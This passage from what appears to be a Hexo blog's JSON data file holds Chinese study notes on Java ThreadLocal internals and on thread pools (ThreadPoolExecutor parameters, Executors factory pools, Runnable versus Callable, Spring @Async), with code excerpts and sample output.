size--;</span><br><span class=\"line\"> ......</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"4-set\"><a href=\"#4-set\" class=\"headerlink\" title=\"4.set()\"></a>4.set()</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public void set(T value) &#123;</span><br><span class=\"line\">    Thread t = Thread.currentThread();</span><br><span class=\"line\">    ThreadLocalMap map = getMap(t);</span><br><span class=\"line\">    if (map != null)</span><br><span class=\"line\">        map.set(this, value);</span><br><span class=\"line\">    else</span><br><span class=\"line\">        createMap(t, value);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n","site":{"data":{}},"excerpt":"","more":"<p><a href=\"http://www.jasongj.com/java/threadlocal/\" target=\"_blank\" rel=\"noopener\">http://www.jasongj.com/java/threadlocal/</a></p>\n<h1 id=\"一-ThreadLocal作用\"><a href=\"#一-ThreadLocal作用\" class=\"headerlink\" title=\"一.ThreadLocal作用\"></a>一.ThreadLocal作用</h1><h2 id=\"1-作用\"><a href=\"#1-作用\" class=\"headerlink\" title=\"1.作用\"></a>1.作用</h2><p>一半都说是实现了变量在线程间隔离,在类或者方法间共享。<br><br>但是看到这句话一脸迷茫，怎么实现的，为什么要实现??</p>\n<h2 id=\"2-为什么要用\"><a href=\"#2-为什么要用\" class=\"headerlink\" title=\"2.为什么要用\"></a>2.为什么要用</h2><p>通常情况下，我们创建的变量是可以被任何一个线程访问并修改的。而使用ThreadLocal创建的变量只能被当前线程访问，其他线程则无法访问和修改(线程间隔离),同时在改线程的类或方法中，都能获取该变量的同一实例(方法间共享)。</p>\n<h2 id=\"3-例子\"><a href=\"#3-例子\" class=\"headerlink\" title=\"3.例子\"></a>3.例子</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public class ThreadLocalTest &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    public static void main(String[] args) throws InterruptedException &#123;</span><br><span class=\"line\">        InnerClass innerClass = new InnerClass();</span><br><span class=\"line\">        for(int i = 1; i &lt;= 2; i++) &#123;</span><br><span class=\"line\">            new Thread(() -&gt; &#123;</span><br><span class=\"line\">                for(int j = 0; j &lt; 2; j++) &#123;</span><br><span class=\"line\">                    innerClass.add(String.valueOf(j));</span><br><span class=\"line\">                    innerClass.print();</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                innerClass.set(&quot;hello world&quot;);</span><br><span class=\"line\">            &#125;, &quot;thread - &quot; + i).start();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    private static class InnerClass &#123;</span><br><span class=\"line\">        public void add(String newStr) &#123;</span><br><span class=\"line\">            StringBuilder str = Counter.counter.get();</span><br><span class=\"line\">            Counter.counter.set(str.append(newStr));</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        public void print() &#123;</span><br><span class=\"line\">            System.out.printf(&quot;Thread name:%s , ThreadLocal hashcode:%s, Instance hashcode:%s, Value:%s\\n&quot;,</span><br><span class=\"line\">                    Thread.currentThread().getName(),</span><br><span class=\"line\">                    Counter.counter.hashCode(),</span><br><span class=\"line\">                    Counter.counter.get().hashCode(),</span><br><span class=\"line\">                    Counter.counter.get().toString());</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        public void set(String words) &#123;</span><br><span class=\"line\">            Counter.counter.set(new StringBuilder(words));</span><br><span class=\"line\">            System.out.printf(&quot;Set, Thread name:%s , ThreadLocal hashcode:%s,  Instance hashcode:%s, Value:%s\\n&quot;,</span><br><span class=\"line\">                    Thread.currentThread().getName(),</span><br><span class=\"line\">                    Counter.counter.hashCode(),</span><br><span class=\"line\">                    Counter.counter.get().hashCode(),</span><br><span class=\"line\">                    Counter.counter.get().toString());</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    private static class Counter &#123;</span><br><span class=\"line\">        private static ThreadLocal&lt;StringBuilder&gt; counter = new ThreadLocal&lt;StringBuilder&gt;() &#123;</span><br><span class=\"line\">            //重写 initialValue 为ThreadLocal get()提供初始值</span><br><span class=\"line\">            @Override</span><br><span class=\"line\">            protected StringBuilder initialValue() &#123;</span><br><span class=\"line\">                return new StringBuilder();</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>结果</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1 Thread name:thread - 1 , ThreadLocal hashcode:1101022441, Instance hashcode:1332191917, Value:0</span><br><span class=\"line\">2 Thread name:thread - 1 , ThreadLocal hashcode:1101022441, Instance hashcode:1332191917, Value:01</span><br><span class=\"line\">3 Set, Thread name:thread - 1 , ThreadLocal hashcode:1101022441,  Instance hashcode:1821539951, Value:hello world</span><br><span class=\"line\">4 Thread name:thread - 2 , ThreadLocal hashcode:1101022441, Instance hashcode:831382771, Value:0</span><br><span class=\"line\">5 Thread name:thread - 2 , ThreadLocal hashcode:1101022441, Instance hashcode:831382771, Value:01</span><br><span class=\"line\">6 Set, Thread name:thread - 2 , ThreadLocal hashcode:1101022441,  Instance hashcode:1061821618, Value:hello world</span><br></pre></td></tr></table></figure>\n<p>结果分析：<br><br>在这个例子里面 StringBuilder 为 ThreadLocal中的变量.<br></p>\n<ul>\n<li><p>从结果 1-6 ThreadLocal hashcode可以看到，所有threadlocal都是同一个实例</p>\n</li>\n<li><p>从结果 1,2和4,5  Instance hashcode 和 value可以看到, 在同一个线程中,变量是共享的，在不同线程中，是不同的变量</p>\n</li>\n<li><p>从结果 12和3，45和6中的 Instance hashCode 可以看出，ThreadLocal 的set() 方法，可以改变ThreadLocal中的变量实例</p>\n</li>\n<li><p>从代码中可见， 虽然都是 Counter.counter.get() 得到value再拼接，但是，在不同线程中，有自己的副本，不影响其它现在，这里set()没有改变变量实例，是因为 用的就是当前实例，没有new StringBuilder(words)；</p>\n</li>\n</ul>\n<h1 id=\"二-原理\"><a href=\"#二-原理\" class=\"headerlink\" title=\"二.原理\"></a>二.原理</h1><p>实现</p>\n<h2 id=\"1-构造方法\"><a href=\"#1-构造方法\" class=\"headerlink\" title=\"1.构造方法\"></a>1.构造方法</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public ThreadLocal() &#123;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">//如果想在初始化时设置get()的初始值，需要重写initialValue方法</span><br><span class=\"line\">private static ThreadLocal&lt;StringBuilder&gt; counter = new ThreadLocal&lt;StringBuilder&gt;() &#123;</span><br><span class=\"line\">    @Override</span><br><span class=\"line\">    protected StringBuilder initialValue() &#123;</span><br><span class=\"line\">        return new StringBuilder();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<h2 id=\"2-get\"><a href=\"#2-get\" class=\"headerlink\" title=\"2.get()\"></a>2.get()</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public T get() &#123;</span><br><span class=\"line\">    Thread t = Thread.currentThread();</span><br><span class=\"line\">    ThreadLocalMap map = getMap(t);</span><br><span class=\"line\">    if (map != null) &#123;</span><br><span class=\"line\">        ThreadLocalMap.Entry e = map.getEntry(this);</span><br><span class=\"line\">        if (e != null) &#123;</span><br><span class=\"line\">            @SuppressWarnings(&quot;unchecked&quot;)</span><br><span class=\"line\">            T result = (T)e.value;</span><br><span class=\"line\">            return result;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    return setInitialValue();</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>可以看出，在ThreadLocal中，使用了ThreadLocalMap 来维护变量与线程之间的关系，其中 Thread为key.<br><br>如果不存在，则调用 setInitialValue()初始化，setInitialValue()又调用了initialValue(), 所以，初始化时，需要重写initialValue方法,可以在get()时得到我们相要的值.</p>\n<h2 id=\"3-ThreadLocalMap\"><a href=\"#3-ThreadLocalMap\" class=\"headerlink\" title=\"3.ThreadLocalMap\"></a>3.ThreadLocalMap</h2><p>ThreadLocalMap 为 ThreadLocal 的静态内部类。<br></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">static class ThreadLocalMap &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    static class Entry extends WeakReference&lt;ThreadLocal&lt;?&gt;&gt; &#123;</span><br><span class=\"line\">        /** The value associated with this ThreadLocal. */</span><br><span class=\"line\">        Object value;</span><br><span class=\"line\"></span><br><span class=\"line\">        Entry(ThreadLocal&lt;?&gt; k, Object v) &#123;</span><br><span class=\"line\">            super(k);</span><br><span class=\"line\">            value = v;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    .....</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>在ThreadLocalMap中 Entry是弱引用<br><br>使用ThreadLocal的弱引用作为key<br></p>\n<ul>\n<li>为什么要用弱引用</li>\n</ul>\n<p>弱引用实例不会影响到被应用对象的GC回收行为，什么意思呢？<br><br>如果一个对象通过一串强引用链接可到达(Strongly reachable)，它是不会被回收的。而弱引用不能阻挡垃圾回收器对其回收。<br></p>\n<p>但是由于每个线程访问某 ThreadLocal 变量后，都会在自己的 Map 内维护该 ThreadLocal 变量与具体实例的映射(ThreadLocalMap)，如果不删除这些引用（映射），则这些 ThreadLocal 不能被回收，可能会造成内存泄漏<br></p>\n<p>所以,使用弱引用的原因在于，当没有强引用指向 ThreadLocal 变量时，它可被回收，从而避免上文所述 ThreadLocal 不能被回收而造成的内存泄漏的问题。<br></p>\n<p>但是，因为key为弱引用，当垃圾回收后，可能会形成key为null，value还存在的内存泄露问题。所以，ThreadLocal 会在 get或set时，擦除这种value.</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">private Entry getEntry(ThreadLocal&lt;?&gt; key) &#123;</span><br><span class=\"line\">     int i = key.threadLocalHashCode &amp; (table.length - 1);</span><br><span class=\"line\">     Entry e = table[i];</span><br><span class=\"line\">     if (e != null &amp;&amp; e.get() == key)</span><br><span class=\"line\">         return e;</span><br><span class=\"line\">     else</span><br><span class=\"line\">         return getEntryAfterMiss(key, i, e);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">private Entry getEntryAfterMiss(ThreadLocal&lt;?&gt; key, int i, Entry e) &#123;</span><br><span class=\"line\">    Entry[] tab = table;</span><br><span class=\"line\">    int len = tab.length;</span><br><span class=\"line\"></span><br><span class=\"line\">    while (e != null) &#123;</span><br><span class=\"line\">        ThreadLocal&lt;?&gt; k = e.get();</span><br><span class=\"line\">        if (k == key)</span><br><span class=\"line\">            return e;</span><br><span class=\"line\">        if (k == null)</span><br><span class=\"line\">            expungeStaleEntry(i);</span><br><span class=\"line\">        else</span><br><span class=\"line\">            i = nextIndex(i, len);</span><br><span class=\"line\">        e = tab[i];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    return null;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">//擦除</span><br><span class=\"line\">private int expungeStaleEntry(int staleSlot) &#123;</span><br><span class=\"line\">       Entry[] tab = table;</span><br><span class=\"line\">       int len = tab.length;</span><br><span class=\"line\"></span><br><span class=\"line\">       // expunge entry at staleSlot</span><br><span class=\"line\">       tab[staleSlot].value = null;</span><br><span class=\"line\">       tab[staleSlot] = null;</span><br><span class=\"line\">       size--;</span><br><span class=\"line\"> ......</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"4-set\"><a href=\"#4-set\" class=\"headerlink\" title=\"4.set()\"></a>4.set()</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public void set(T value) &#123;</span><br><span class=\"line\">    Thread t = Thread.currentThread();</span><br><span class=\"line\">    ThreadLocalMap map = getMap(t);</span><br><span class=\"line\">    if (map != null)</span><br><span class=\"line\">        map.set(this, value);</span><br><span class=\"line\">    else</span><br><span class=\"line\">        createMap(t, value);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n"},{"title":"线程池简要了解","date":"2019-07-27T20:43:55.000Z","_content":"\n# 一.为什么要用线程池\n\n为了并发的执行任务，减少任务执行时间，提升性能 ---多线程.<br>\n减少创建和销毁线程的次数(复用)，同时方便管理 --- 线程池<br>\n\n# 二.线程池\n\n## 1.ThreadPoolExecutor\n\nThreadPoolExecutor 允许我们灵活的定义自己的线程池.<br>\n\n```\nThreadPoolExecutor(int corePoolSize,\n                        int maximumPoolSize,\n                        long keepAliveTime,\n                        TimeUnit unit,\n                        BlockingQueue<Runnable> workQueue,\n                        ThreadFactory threadFactory,\n                        RejectedExecutionHandler handler)\n```\n- corePoolSize\n\n核心线程数，默认情况下核心线程会一直存活，即使处于闲置状态也不会受存keepAliveTime限制。除非将allowCoreThreadTimeOut设置为true。\n\n- maximumPoolSize\n\n线程池所能容纳的最大线程数。超过这个数的线程将被阻塞。当任务队列为没有设置大小的LinkedBlockingDeque时，这个值无效。\n\n- keepAliveTime\n\n非核心线程的闲置超时时间，超过这个时间就会被回收\n\n- unit\n\n指定keepAliveTime的单位，如TimeUnit.SECONDS。当将allowCoreThreadTimeOut设置为true时对corePoolSize生效。\n\n- workQueue\n\n线程池中的任务队列.<br>\n常用的有三种队列：SynchronousQueue,LinkedBlockingDeque,ArrayBlockingQueue。\n\n- threadFactory\n\n线程工厂，提供创建新线程的功能。ThreadFactory是一个接口，只有一个方法\n\n```\npublic interface ThreadFactory {\n  Thread newThread(Runnable r);\n}\n```\n- RejectedExecutionHandler\n\nRejectedExecutionHandler也是一个接口，只有一个方法\n\n```\npublic interface RejectedExecutionHandler {\n  void rejectedExecution(Runnable var1, ThreadPoolExecutor var2);\n}\n```\n默认: AbortPolicy、CallerRunsPolicy、DiscardOldestPolicy、DiscardPolicy\n\n## 2.四种线程池 和 ThreadPoolExecutor关系\n\n四种线程池只是和ThreadPoolExecutor一样的ExecutorSerivice的其它四种实现方式  ，我们可以根据情况灵活选用或者自定义自己的线程池.<br>\n\n- newSingleThreadExecutor\n\n创建一个单线程的线程池,这个线程池只有一个线程在工作，也就是相当于单线程串行执行所有任务。如果这个唯一的线程因为异常结束，那么会有一个新的线程来替代它。此线程池保证所有任务的执行顺序按照任务的提交顺序执行\n\n- newFixedThreadPool\n\n创建固定大小的线程池。每次提交一个任务就创建一个线程，直到线程达到线程池的最大大小。线程池的大小一旦达到最大值就会保持不变，如果某个线程因为执行异常而结束，那么线程池会补充一个新线程。\n\n- newCachedThreadPool\n\n创建一个可缓存的线程池。如果线程池的大小超过了处理任务所需要的线程，\n那么就会回收部分空闲（60秒不执行任务）的线程，当任务数增加时，此线程池又可以智能的添加新线程来处理任务。此线程池不会对线程池大小做限制，线程池大小完全依赖于操作系统（或者说JVM）能够创建的最大线程大小。\n\n- newScheduledThreadPool\n\n创建一个大小无限的线程池。此线程池支持定时以及周期性执行任务的需求。\n\n\n\n## 3.ThreadPoolExecutor 和 ThreadPoolTaskExecutor关系\n\nThreadPoolTaskExecutor 是 ThreadPoolExecutor 在spring中的实现方式。\n\n# 三.线程池加异步，为什么\n\n异步任务特点就是不阻塞。<br>\n和线程池一起使用时，可以异步的获取线程的返回结果<br>\n\n重点是这个可以很方便的获取到返回结果。<br>\n\n其它原因，还未理解到<br>\n\n\n# 四.Runnable 和  Callable\n\n```\npublic interface Runnable {\n    public abstract void run();\n}\n\n```\n```\npublic interface Callable<V> {\n    V call() throws Exception;\n}\n```\n\n可以看到:<br>\n\n1.runable可以得到返回结果，所以可以配合Future实现异步<br>\n2.可以抛出异常<br>\n\n# 五.Spring @Async\n\nspring中 @Async 会优先使用自定义线程池，如果没有自定义的Executor，所以使用缺省的TaskExecutor\n","source":"_posts/java/thread/线程池简要了解.md","raw":"---\ntitle: 线程池简要了解\ndate: 2019-07-27 16:43:55\ntags: [java]\n---\n\n# 一.为什么要用线程池\n\n为了并发的执行任务，减少任务执行时间，提升性能 ---多线程.<br>\n减少创建和销毁线程的次数(复用)，同时方便管理 --- 线程池<br>\n\n# 二.线程池\n\n## 1.ThreadPoolExecutor\n\nThreadPoolExecutor 允许我们灵活的定义自己的线程池.<br>\n\n```\nThreadPoolExecutor(int corePoolSize,\n                        int maximumPoolSize,\n                        long keepAliveTime,\n                        TimeUnit unit,\n                        BlockingQueue<Runnable> workQueue,\n                        ThreadFactory threadFactory,\n                        RejectedExecutionHandler handler)\n```\n- corePoolSize\n\n核心线程数，默认情况下核心线程会一直存活，即使处于闲置状态也不会受存keepAliveTime限制。除非将allowCoreThreadTimeOut设置为true。\n\n- maximumPoolSize\n\n线程池所能容纳的最大线程数。超过这个数的线程将被阻塞。当任务队列为没有设置大小的LinkedBlockingDeque时，这个值无效。\n\n- keepAliveTime\n\n非核心线程的闲置超时时间，超过这个时间就会被回收\n\n- unit\n\n指定keepAliveTime的单位，如TimeUnit.SECONDS。当将allowCoreThreadTimeOut设置为true时对corePoolSize生效。\n\n- workQueue\n\n线程池中的任务队列.<br>\n常用的有三种队列：SynchronousQueue,LinkedBlockingDeque,ArrayBlockingQueue。\n\n- threadFactory\n\n线程工厂，提供创建新线程的功能。ThreadFactory是一个接口，只有一个方法\n\n```\npublic interface ThreadFactory {\n  Thread newThread(Runnable r);\n}\n```\n- RejectedExecutionHandler\n\nRejectedExecutionHandler也是一个接口，只有一个方法\n\n```\npublic interface RejectedExecutionHandler {\n  void rejectedExecution(Runnable var1, ThreadPoolExecutor var2);\n}\n```\n默认: AbortPolicy、CallerRunsPolicy、DiscardOldestPolicy、DiscardPolicy\n\n## 2.四种线程池 和 ThreadPoolExecutor关系\n\n四种线程池只是和ThreadPoolExecutor一样的ExecutorSerivice的其它四种实现方式  ，我们可以根据情况灵活选用或者自定义自己的线程池.<br>\n\n- newSingleThreadExecutor\n\n创建一个单线程的线程池,这个线程池只有一个线程在工作，也就是相当于单线程串行执行所有任务。如果这个唯一的线程因为异常结束，那么会有一个新的线程来替代它。此线程池保证所有任务的执行顺序按照任务的提交顺序执行\n\n- newFixedThreadPool\n\n创建固定大小的线程池。每次提交一个任务就创建一个线程，直到线程达到线程池的最大大小。线程池的大小一旦达到最大值就会保持不变，如果某个线程因为执行异常而结束，那么线程池会补充一个新线程。\n\n- newCachedThreadPool\n\n创建一个可缓存的线程池。如果线程池的大小超过了处理任务所需要的线程，\n那么就会回收部分空闲（60秒不执行任务）的线程，当任务数增加时，此线程池又可以智能的添加新线程来处理任务。此线程池不会对线程池大小做限制，线程池大小完全依赖于操作系统（或者说JVM）能够创建的最大线程大小。\n\n- newScheduledThreadPool\n\n创建一个大小无限的线程池。此线程池支持定时以及周期性执行任务的需求。\n\n\n\n## 3.ThreadPoolExecutor 和 ThreadPoolTaskExecutor关系\n\nThreadPoolTaskExecutor 是 ThreadPoolExecutor 在spring中的实现方式。\n\n# 三.线程池加异步，为什么\n\n异步任务特点就是不阻塞。<br>\n和线程池一起使用时，可以异步的获取线程的返回结果<br>\n\n重点是这个可以很方便的获取到返回结果。<br>\n\n其它原因，还未理解到<br>\n\n\n# 四.Runnable 和  Callable\n\n```\npublic interface Runnable {\n    public abstract void run();\n}\n\n```\n```\npublic interface Callable<V> {\n    V call() throws Exception;\n}\n```\n\n可以看到:<br>\n\n1.runable可以得到返回结果，所以可以配合Future实现异步<br>\n2.可以抛出异常<br>\n\n# 五.Spring @Async\n\nspring中 @Async 会优先使用自定义线程池，如果没有自定义的Executor，所以使用缺省的TaskExecutor\n","slug":"java/thread/线程池简要了解","published":1,"updated":"2019-10-13T12:15:12.172Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck23321lp004o6dcpn08zcuzn","content":"<h1 id=\"一-为什么要用线程池\"><a href=\"#一-为什么要用线程池\" class=\"headerlink\" title=\"一.为什么要用线程池\"></a>一.为什么要用线程池</h1><p>为了并发的执行任务，减少任务执行时间，提升性能 —多线程.<br><br>减少创建和销毁线程的次数(复用)，同时方便管理 — 线程池<br></p>\n<h1 id=\"二-线程池\"><a href=\"#二-线程池\" class=\"headerlink\" title=\"二.线程池\"></a>二.线程池</h1><h2 id=\"1-ThreadPoolExecutor\"><a href=\"#1-ThreadPoolExecutor\" class=\"headerlink\" title=\"1.ThreadPoolExecutor\"></a>1.ThreadPoolExecutor</h2><p>ThreadPoolExecutor 允许我们灵活的定义自己的线程池.<br></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ThreadPoolExecutor(int corePoolSize,</span><br><span class=\"line\">                        int maximumPoolSize,</span><br><span class=\"line\">                        long keepAliveTime,</span><br><span class=\"line\">                        TimeUnit unit,</span><br><span class=\"line\">                        BlockingQueue&lt;Runnable&gt; workQueue,</span><br><span class=\"line\">                        ThreadFactory threadFactory,</span><br><span class=\"line\">                        RejectedExecutionHandler handler)</span><br></pre></td></tr></table></figure>\n<ul>\n<li>corePoolSize</li>\n</ul>\n<p>核心线程数，默认情况下核心线程会一直存活，即使处于闲置状态也不会受存keepAliveTime限制。除非将allowCoreThreadTimeOut设置为true。</p>\n<ul>\n<li>maximumPoolSize</li>\n</ul>\n<p>线程池所能容纳的最大线程数。超过这个数的线程将被阻塞。当任务队列为没有设置大小的LinkedBlockingDeque时，这个值无效。</p>\n<ul>\n<li>keepAliveTime</li>\n</ul>\n<p>非核心线程的闲置超时时间，超过这个时间就会被回收</p>\n<ul>\n<li>unit</li>\n</ul>\n<p>指定keepAliveTime的单位，如TimeUnit.SECONDS。当将allowCoreThreadTimeOut设置为true时对corePoolSize生效。</p>\n<ul>\n<li>workQueue</li>\n</ul>\n<p>线程池中的任务队列.<br><br>常用的有三种队列：SynchronousQueue,LinkedBlockingDeque,ArrayBlockingQueue。</p>\n<ul>\n<li>threadFactory</li>\n</ul>\n<p>线程工厂，提供创建新线程的功能。ThreadFactory是一个接口，只有一个方法</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public interface ThreadFactory &#123;</span><br><span class=\"line\">  Thread newThread(Runnable r);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<ul>\n<li>RejectedExecutionHandler</li>\n</ul>\n<p>RejectedExecutionHandler也是一个接口，只有一个方法</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public interface RejectedExecutionHandler &#123;</span><br><span class=\"line\">  void rejectedExecution(Runnable var1, ThreadPoolExecutor var2);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>默认: AbortPolicy、CallerRunsPolicy、DiscardOldestPolicy、DiscardPolicy</p>\n<h2 id=\"2-四种线程池-和-ThreadPoolExecutor关系\"><a href=\"#2-四种线程池-和-ThreadPoolExecutor关系\" class=\"headerlink\" title=\"2.四种线程池 和 ThreadPoolExecutor关系\"></a>2.四种线程池 和 ThreadPoolExecutor关系</h2><p>四种线程池只是和ThreadPoolExecutor一样的ExecutorSerivice的其它四种实现方式  ，我们可以根据情况灵活选用或者自定义自己的线程池.<br></p>\n<ul>\n<li>newSingleThreadExecutor</li>\n</ul>\n<p>创建一个单线程的线程池,这个线程池只有一个线程在工作，也就是相当于单线程串行执行所有任务。如果这个唯一的线程因为异常结束，那么会有一个新的线程来替代它。此线程池保证所有任务的执行顺序按照任务的提交顺序执行</p>\n<ul>\n<li>newFixedThreadPool</li>\n</ul>\n<p>创建固定大小的线程池。每次提交一个任务就创建一个线程，直到线程达到线程池的最大大小。线程池的大小一旦达到最大值就会保持不变，如果某个线程因为执行异常而结束，那么线程池会补充一个新线程。</p>\n<ul>\n<li>newCachedThreadPool</li>\n</ul>\n<p>创建一个可缓存的线程池。如果线程池的大小超过了处理任务所需要的线程，<br>那么就会回收部分空闲（60秒不执行任务）的线程，当任务数增加时，此线程池又可以智能的添加新线程来处理任务。此线程池不会对线程池大小做限制，线程池大小完全依赖于操作系统（或者说JVM）能够创建的最大线程大小。</p>\n<ul>\n<li>newScheduledThreadPool</li>\n</ul>\n<p>创建一个大小无限的线程池。此线程池支持定时以及周期性执行任务的需求。</p>\n<h2 id=\"3-ThreadPoolExecutor-和-ThreadPoolTaskExecutor关系\"><a href=\"#3-ThreadPoolExecutor-和-ThreadPoolTaskExecutor关系\" class=\"headerlink\" title=\"3.ThreadPoolExecutor 和 ThreadPoolTaskExecutor关系\"></a>3.ThreadPoolExecutor 和 ThreadPoolTaskExecutor关系</h2><p>ThreadPoolTaskExecutor 是 ThreadPoolExecutor 在spring中的实现方式。</p>\n<h1 